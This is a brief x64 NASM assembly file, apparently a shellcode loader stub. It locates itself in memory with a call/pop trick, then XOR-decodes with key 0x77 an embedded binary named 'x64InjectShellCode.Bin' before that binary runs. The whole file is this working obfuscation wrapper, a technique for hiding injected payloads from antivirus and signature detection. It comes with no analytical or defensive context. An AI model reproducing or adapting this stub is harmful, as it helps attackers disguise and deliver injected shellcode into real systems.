USE64
UnCompress_Start:
call GetCurrentAddress 
GetCurrentAddress:
BASE_OFFSET_CURRENT_ADDRESS equ (GetCurrentAddress - UnCompress_Start)
pop rdx
sub rdx,BASE_OFFSET_CURRENT_ADDRESS
lea rdi,[rdx + CompressShellCode_Start]
mov rcx,CompressShellCode_End - CompressShellCode_Start
UnCompressShellCode:
xor byte [rdi],0x77
inc rdi
loop UnCompressShellCode
CompressShellCode_Start:
incbin './x64InjectShellCode.Bin'
CompressShellCode_End:
UnCompress_End: